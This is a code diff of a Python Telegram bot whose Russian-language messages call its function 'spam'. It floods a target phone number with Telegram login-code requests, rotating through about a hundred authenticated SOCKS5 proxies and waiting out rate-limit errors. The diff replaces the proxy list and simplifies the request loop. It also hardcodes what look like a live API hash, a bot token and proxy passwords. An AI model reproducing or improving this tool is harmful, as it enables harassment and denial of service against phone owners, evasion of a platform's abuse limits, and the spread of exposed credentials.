@@ -10,108 +10,115 @@ API_ID = 35911533
 API_HASH = "11dafcdc1514796c867055023716d39a"
 BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
 
-proxy_list = [
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.164.209','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'217.181.90.131','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.172.50','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.23.119','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.42.120','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.54.119','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.31.218','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.176.220','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.30.119','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.35.94','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.173.97','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.58.65','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.54.74','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.167.25.6','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.229.129','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.237.153','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.62.233','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.46.223','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.226.78','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.234.175','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.22.141','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.163.159','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.189.248','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.43.242','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.41.255','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.93','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.59.222','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.229','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.191.171','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'217.181.90.19','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.40.106','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.118','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.10.31','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.42.10','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.46.175','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.31.81','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.45.102','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.50.250','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.170.128','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.238.176','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.232.81','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.227','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.29.24','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.51.223','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.231.245','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.239.39','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.195','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.167.25.238','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.85','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.35.231','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.49.95','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.187.109','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.177.96','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.169.14','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.33.77','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.53.97','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.224.121','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.3.3','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'193.56.28.159','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.40.118','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.181.108','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.27.100','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.247.45','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.168.207','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.52.155','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.171.173','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.36.214','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.4.146','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.52.157','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.25.126','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.62.190','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.242.8','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.46.202','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.38.241','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.235.10','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.9.50','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.8.17','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.190','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.191.241','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.168','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.236.238','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.33.183','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.246.228','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.24.112','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.33.183','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.34.191','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.27.165','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'209.50.165.75','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.178.227','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'193.56.28.78','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.244.2','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.7.240','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.43.137','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.39.120','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'216.26.252.133','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.48.50','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'104.207.38.227','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'65.111.20.130','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'151.123.177.155','port':3129},
-{'login':'fxmu517o2lav','password':'solpaiosc7ghcbc','ip':'45.3.49.223','port':3129}
+proxy_strings = [
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.14.0:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.163.33:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.161.174:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.185.174:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.248.120:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.167.25.128:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@217.181.90.97:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.44.221:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.163.139:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.56.56:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.255.210:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.168.110:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.32.84:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.34.161:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.42.188:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.62.143:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.173.110:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.229.56:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.45.254:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.24.145:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.248.220:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.56.49:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.28.189:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.163.222:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.45.40:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.34.179:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.62.141:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.46.158:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.39.216:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.60.114:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.4.47:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.167.25.35:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.251.247:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.188.35:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.23.194:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.226.134:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.165.191:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.47.2:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.163.105:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.178.157:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.43.85:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.40.46:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.233.233:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.255.232:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.52.5:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.233.77:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.38.171:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.37.77:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.29.171:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.179.152:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.9.96:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.183.147:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.44.166:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.165.33:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.12.194:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.36.6:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.51.106:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.189.162:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.176.3:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.49.239:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.185.197:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.189.143:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.254.2:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.175.52:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.252.80:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.33.111:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.178.204:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.183.108:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.234.165:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.255.40:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.165.97:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.228.188:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.59.161:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.181.251:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.58.203:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.33.150:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.49.180:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.62.83:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.252.28:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.252.87:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.59.76:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@193.56.28.100:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.176.177:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.174.75:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.240.163:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@195.63.31.47:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.11.118:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.181.71:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.248.34:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.185.76:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.243.9:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.24.234:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@45.3.39.193:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@209.50.177.13:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.237.210:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.35.239:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.38.229:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@216.26.237.197:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@104.207.35.50:3129",
+"xa07h4pxkwx6:zj4egf2z4s6ricy@65.111.9.230:3129"
 ]
+
+proxy_list = []
+for s in proxy_strings:
+    login_pass, ip_port = s.split('@')
+    login, password = login_pass.split(':')
+    ip, port = ip_port.split(':')
+    proxy_list.append({'login': login, 'password': password, 'ip': ip, 'port': int(port)})
 
 spam_tasks = {}
 
@@ -150,29 +157,26 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
             proxy = proxy_list[idx % len(proxy_list)]
             idx += 1
             proxy_tuple = (socks.SOCKS5, proxy['ip'], proxy['port'], proxy['login'], proxy['password'])
-            for attempt in range(3):
-                try:
-                    async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged, timeout=15) as temp_client:
-                        await temp_client.connect()
-                        await temp_client.send_code_request(phone)
-                        count += 1
-                        await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone} через {proxy['ip']}")
-                        break
-                except FloodWaitError as e:
-                    await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {proxy['ip']}")
-                    await asyncio.sleep(e.seconds)
-                    break
-                except Exception as e:
-                    err = str(e)
-                    if attempt == 2:
-                        await context.bot.send_message(chat_id, f"Ошибка на {proxy['ip']}: {err}")
-                    else:
-                        await asyncio.sleep(1)
+            try:
+                async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged, timeout=15) as temp_client:
+                    await temp_client.connect()
+                    await temp_client.send_code_request(phone)
+                    count += 1
+                    await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone} через {proxy['ip']}")
+            except FloodWaitError as e:
+                await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {proxy['ip']}")
+                await asyncio.sleep(e.seconds)
+            except Exception as e:
+                err = str(e)
+                if "all available options" in err or "ResendCodeRequest" in err:
+                    await context.bot.send_message(chat_id, f"Все методы на {proxy['ip']}, меняем.")
+                else:
+                    await context.bot.send_message(chat_id, f"Ошибка на {proxy['ip']}: {err}")
             await asyncio.sleep(0.3)
 
     task = asyncio.create_task(spam())
     spam_tasks[chat_id] = (task, client)
-    await update.message.reply_text("Запущен спам с ротацией прокси. Для остановки /stop")
+    await update.message.reply_text("Запущен спам с новыми прокси. /stop для остановки.")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
